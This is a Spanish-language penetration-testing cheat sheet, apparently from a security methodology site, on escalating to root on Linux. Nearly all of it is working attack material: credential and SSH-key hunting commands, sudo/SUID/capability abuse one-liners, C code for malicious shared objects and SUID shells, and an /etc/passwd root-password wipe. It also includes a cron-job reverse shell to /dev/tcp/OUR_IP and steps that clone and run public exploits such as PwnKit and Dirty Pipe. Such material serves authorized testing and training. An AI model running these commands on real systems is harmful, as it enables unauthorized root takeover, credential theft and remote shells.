---
title: "Linux PrivEsc"
description: "SUID, sudo, cron jobs, capabilities y exploits de kernel."
sidebar:
  order: 2
  label: "Linux PrivEsc"
---
> Técnicas para escalar de usuario de bajo privilegio a root en Linux: enumeración, abuso de SUID/capabilities/sudo, contenedores, kernel exploits y library hijacking.

---


## Enumeración — Sistema y usuarios

```bash
# Identidad y grupos
whoami; id; groups
sudo -l                                    # ← SIEMPRE empezar aquí

# Sistema
uname -a                                   # kernel + arch
cat /proc/version
cat /etc/os-release; cat /etc/lsb-release

# Procesos y servicios
ps aux
ps aux | grep root                         # procesos corriendo como root

# Variables de entorno
env; set

# Historial y archivos de configuración
history
cat ~/.bash_history
ls -la ~/
cat ~/.bashrc ~/.bash_profile ~/.profile

# Red
hostname -I; ip a; ifconfig
netstat -antp; ss -antp
cat /etc/hosts
```

---

## Credential Hunting

```bash
# Archivos de configuración con credenciales
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "wp-config.php" -o -name "config.php" 2>/dev/null
find / -name ".env" 2>/dev/null
cat /var/www/html/wp-config.php

# Claves SSH
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
ls -la ~/.ssh/
cat ~/.ssh/id_rsa

# Archivos world-readable potencialmente sensibles
find / -not \( -path /proc -prune \) -not \( -path /sys -prune \) \
  -name "*.txt" -o -name "*.log" 2>/dev/null | xargs grep -i "password\|passwd\|secret" 2>/dev/null

# Bases de datos
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null

# Historial de comandos de todos los usuarios
find /home -name ".bash_history" 2>/dev/null | xargs cat 2>/dev/null
cat /root/.bash_history 2>/dev/null
```

---

## Sudo — Abuso de permisos

```bash
sudo -l    # ver qué podemos ejecutar como root

# GTFOBins — buscar el binario en https://gtfobins.github.io/#
# Ejemplos:
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo vim -c ':!/bin/sh'
sudo less /etc/passwd    # luego !/bin/sh

# LD_PRELOAD (si sudo -l muestra env_keep+=LD_PRELOAD)
cat > /tmp/root.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart   # cualquier binario sudo

# CVE-2021-3156 (sudo < 1.9.3 — Baron Samedit)
sudo -V | head -n1    # verificar versión
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156 && make
./sudo-hax-me-a-sandwich    # seleccionar target OS
./sudo-hax-me-a-sandwich 1  # 0=Ubuntu 18.04 / 1=Ubuntu 20.04 / 2=Debian 10

# CVE-2019-14287 (sudo < 1.8.28 — -u#-1 bypass)
sudo -u#-1 id    # → uid=0(root) — si el usuario puede correr sudo
```

---

## SUID / SGID

```bash
# Buscar binarios SUID
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -perm -4000 2>/dev/null

# Buscar binarios SGID
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

# GTFOBins para el binario encontrado
# Ejemplos comunes:
/bin/bash -p           # si bash tiene SUID → shell como owner
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'  # si python SUID
```

### Shared Object Hijacking (SUID + RUNPATH writable)

```bash
# Identificar biblioteca no estándar
ldd /path/to/suid_binary
readelf -d /path/to/suid_binary | grep PATH    # buscar RUNPATH writable

# Si /development (u otro path) es writable:
# Crear biblioteca maliciosa con la función requerida
./suid_binary    # → error: undefined symbol: dbquery
cat > /tmp/src.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
void dbquery() { setuid(0); system("/bin/sh -p"); }
EOF
gcc /tmp/src.c -fPIC -shared -o /development/libshared.so
./suid_binary    # → root shell
```

---

## Linux Capabilities

```bash
# Enumerar capabilities
find /usr/bin /usr/sbin /usr/local/bin -type f -exec getcap {} \; 2>/dev/null
# También:
getcap -r / 2>/dev/null

# cap_setuid → setuid(0) directo
# Python con cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cap_dac_override → ignorar permisos de lectura/escritura
# vim con cap_dac_override para editar /etc/passwd:
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
su    # sin contraseña de root

# cap_sys_admin → montar filesystems (ver Docker/LXD)
```

---

## Cron Jobs

```bash
# Ver crontabs
cat /etc/crontab
ls -la /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.d/
crontab -l

# Monitorear procesos en tiempo real con pspy
./pspy64 -pf -i 1000    # -pf: procesos + FS events / -i 1000ms scan

# Buscar archivos world-writable (potencial script de cron)
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Si el script es writable → append reverse shell
echo 'bash -i >& /dev/tcp/OUR_IP/443 0>&1' >> /dmz-backups/backup.sh
nc -lnvp 443    # esperar la conexión del cron job
```

---

## Docker / Contenedores

### Docker Group (usuario en grupo docker)

```bash
id    # verificar: groups=...,116(docker)

# Montar root del host en /mnt del contenedor
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
# → root shell con acceso a todo el host

# Vía socket Docker writable
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

### Docker Socket dentro de contenedor

```bash
ls -la /var/run/docker.sock    # si writable sin ser root

# Descargar docker binary si no está
wget https://parrot-os/docker -O /tmp/docker && chmod +x /tmp/docker

# Listar contenedores
/tmp/docker -H unix:///app/docker.sock ps

# Crear contenedor privilegiado que monta el host
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

# Ejecutar bash en el nuevo contenedor
/tmp/docker -H unix:///app/docker.sock exec -it <CONTAINER_ID> /bin/bash
cat /hostsystem/root/.ssh/id_rsa    # SSH key de root del host
```

---

## LXC / LXD Escalation

```bash
id    # grupos=...,116(lxd) o 116(lxc)

# Importar imagen (si hay ubuntu-template.tar.xz en el sistema)
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list

# Crear contenedor privilegiado + montar filesystem del host
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# Iniciar y obtener shell root
lxc start privesc
lxc exec privesc /bin/bash
ls /mnt/root    # filesystem del host accesible como root
cat /mnt/root/root/.ssh/id_rsa
```

---

## NFS — no_root_squash

```bash
# Desde Pwnbox — ver exports del target
showmount -e TARGET_IP

# Si /tmp o cualquier share tiene no_root_squash:
cat /etc/exports    # buscar no_root_squash

# Desde Pwnbox como root: crear SUID binary y copiarlo al share NFS
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void) { setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc /tmp/shell.c -o /tmp/shell
sudo mount -t nfs TARGET_IP:/tmp /mnt
cp /tmp/shell /mnt/
chmod u+s /mnt/shell

# En el target (como usuario low-priv)
/tmp/shell    # → bash como root (uid=0)
```

---

## Path Hijacking

```bash
# Verificar si . está en PATH
echo $PATH    # si empieza con .: → vulnerable

# Crear binario malicioso con el nombre del comando buscado
export PATH=.:${PATH}
cat > ls << 'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x ls
# Si algún script SUID llama a "ls" sin ruta absoluta → root shell
```

---

## Wildcard Abuse (tar --checkpoint)

```bash
# En directorio donde cron ejecuta: tar * o tar /path/to/dir/*
echo 'cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash' > /tmp/root.sh
chmod +x /tmp/root.sh
cd /path/donde/cron/hace/tar
echo "" > "--checkpoint-action=exec=sh /tmp/root.sh"
echo "" > --checkpoint=1
# Esperar ejecución del cron → /tmp/rootbash -p → root
/tmp/rootbash -p
```

---

## Shared Library Hijacking

### LD_PRELOAD (vía sudo con env_keep)

```bash
# Requiere: sudo -l muestra env_keep+=LD_PRELOAD y algún binario sudo
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

### Python Library Hijacking

```bash
# 1. Encontrar script SUID o sudo que importa módulo Python
ls -l /path/script.py    # -rwsrwxr-x (SUID)
grep import script.py    # import psutil

# 2. Verificar permisos del módulo
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# Si world-writable → editar y añadir: import os; os.system('id')

# 3. Hijacking vía PYTHONPATH (si sudo SETENV: /usr/bin/python3)
# Crear psutil.py falso en /tmp/
cat > /tmp/psutil.py << 'EOF'
import os
def virtual_memory():
    os.system('/bin/bash')
EOF
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py    # → root shell
```

---

## Grupos especiales

```bash
# Grupo disk → acceso directo a dispositivos de bloque
df -h                        # identificar disco
debugfs /dev/sda1            # abrir con debugfs
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow

# Grupo adm → leer logs del sistema
cat /var/log/apache2/access.log    # credenciales en logs
cat /var/log/auth.log
zcat /var/log/syslog.*.gz

# Grupo lxd/lxc → ver sección LXD arriba
# Grupo docker → ver sección Docker arriba
```

---

## tmux Session Hijacking

```bash
# Verificar sesiones tmux corriendo como root
ps aux | grep tmux

# Verificar permisos del socket
ls -la /shareds    # srw-rw---- 1 root devs 0

# Si somos del grupo devs:
id    # groups=...,1011(devs)
tmux -S /shareds    # → adjuntar a sesión root
```

---

## Screen 4.5.0 Exploit

```bash
screen -v    # Screen version 4.05.00 (GNU) 10-Dec-16
# Exploit requiere compilar dos .so en /tmp y escribir en /etc/ld.so.preload vía -L
# Script disponible públicamente como screen_exploit.sh
./screen_exploit.sh    # → uid=0(root)
```

---

## Kernel Exploits / CVEs conocidos

```bash
# Identificar versión
uname -r
cat /etc/lsb-release

# Dirty Pipe (CVE-2022-0847) — kernels 5.8 a 5.17
# Permite escribir en archivos root con solo acceso de lectura
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits && bash compile.sh
./exploit-1    # modifica /etc/passwd → contraseña root = "piped"
su             # contraseña: piped → root

# exploit-2: requiere SUID binary existente
find / -perm -4000 2>/dev/null
./exploit-2 /usr/bin/sudo    # → root shell

# PwnKit (CVE-2021-4034) — pkexec — prácticamente universal
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034 && gcc cve-2021-4034-poc.c -o poc
./poc    # → root shell

# Netfilter CVE-2021-22555 (kernels 2.6-5.11)
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit && ./exploit

# Netfilter CVE-2022-25636 (kernels 5.4-5.6.10) — puede corromper kernel
git clone https://github.com/Bonfee/CVE-2022-25636.git && make && ./exploit

# Netfilter CVE-2023-32233 (kernel ≤ 6.3.1 — nf_tables UAF)
git clone https://github.com/Liuk3r/CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl && ./exploit

# Dirty COW (CVE-2016-5195) — kernels muy antiguos
# Buscar PoC en https://github.com/dirtycow/dirtycow.github.io

# Kernel genérico
uname -r    # buscar en Google: "linux <versión> exploit"
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
./kernel_exploit
```

---

## Herramientas de enumeración automatizada

```bash
# linPEAS (más completo)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# o transferir y ejecutar:
./linpeas.sh | tee /tmp/linpeas.out

# pspy — monitorear procesos sin root
./pspy64 -pf -i 1000

# LinEnum
./LinEnum.sh -t    # -t: tests exhaustivos

# linux-exploit-suggester
./linux-exploit-suggester.sh

# Lynis (auditoría de hardening)
./lynis audit system
```

---

## Checklist rápido (orden de prioridad)

```
□ sudo -l           → ¿binary directo en GTFOBins? ¿LD_PRELOAD?
□ SUID binaries     → find / -perm -4000 → GTFOBins
□ Capabilities      → getcap -r / → cap_setuid en Python?
□ Cron (pspy64)     → ¿script writable que corre como root?
□ Grupos especiales → docker / lxd / disk / adm
□ /etc/exports      → no_root_squash → SUID desde Pwnbox
□ NFS shares        → showmount -e TARGET
□ Writable scripts  → find / -perm -o+w → PATH en script SUID
□ sudo CVEs         → sudo -V → 1.8.28? 1.9.3?
□ Kernel CVEs       → uname -r → Dirty Pipe? PwnKit? Netfilter?
□ Python/SO hijack  → sudo SETENV + python? RUNPATH writable?
□ Tmux sessions     → ps aux | grep tmux → socket writable?
□ Credenciales      → .bash_history, configs, .env, .ssh
```

---

## Pitfalls / Gotchas

- **sudo -l requiere contraseña a veces** → con `-S` se puede pasar via pipe pero si no tenemos pass, probar otras técnicas primero.
- **GTFOBins no siempre aplica** → verificar flags exactos: `sudo find` vs `sudo find . -exec /bin/sh \; -quit` son muy diferentes.
- **LD_PRELOAD solo funciona si `env_keep+=LD_PRELOAD` aparece en sudo -l** → si está en `env_reset` sin excepción, no funciona.
- **SUID en scripts de bash** → Linux ignora el SUID bit en scripts interpretados (bash, python). Solo aplica a binarios compilados.
- **getcap necesita ruta completa** → `getcap -r /` escanea todo pero puede tardar. Limitar a `/usr/bin /usr/sbin /usr/local/bin`.
- **pspy necesita permisos de ejecución** → `chmod +x pspy64` antes de ejecutar; transferir si no está en el target.
- **NFS no_root_squash** → se necesita ser root en Pwnbox para crear el SUID binary y montarlo. Sin acceso root en Pwnbox, no funciona.
- **Kernel exploits pueden colgar el sistema** → los CVEs de Netfilter son especialmente inestables. Advertir al cliente; no usar en producción sin autorización.
- **Dirty Pipe requiere lectura del archivo** → necesita permiso de lectura (r) en el archivo a modificar (ej. `/etc/passwd`).
- **PwnKit (CVE-2021-4034) es casi universal** → afecta a pkexec desde 2009. Intentarlo si otras técnicas fallan.
- **Docker socket writable** → `ls -la /var/run/docker.sock` y verificar que el grupo sea writable por nuestro usuario.
- **LXD sin imagen local** → buscar `.tar.xz` en el sistema con `find / -name "*.tar.xz" 2>/dev/null`. Si no hay, transferir alpine desde Pwnbox.
- **Shared object hijacking**: el nombre del archivo de la biblioteca debe coincidir exactamente con el que busca el binario, y la función exportada también.
- **Python library path**: `python3 -c 'import sys; print("\n".join(sys.path))'` muestra el orden de búsqueda. El directorio writable debe estar ANTES del directorio real del módulo.

---

## Cheatsheets relacionados

- [Windows Privilege Escalation](/metodologias/privesc/windows-privilege-escalation/) — técnicas equivalentes para Windows
- [Active Directory Enumeration & Attacks](/metodologias/active-directory/active-directory-enumeration-attacks/) — tras root local, pivotar a AD
- [File Transfers](/metodologias/privesc/file-transfers/) — transferir linPEAS, pspy, exploits al target
- [Shells & Payloads](/metodologias/exploitation/shells-payloads/) — reverse shells para los cron jobs y exploits
- [Pivoting, Tunneling, and Port Forwarding](/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — post-explotación tras privesc
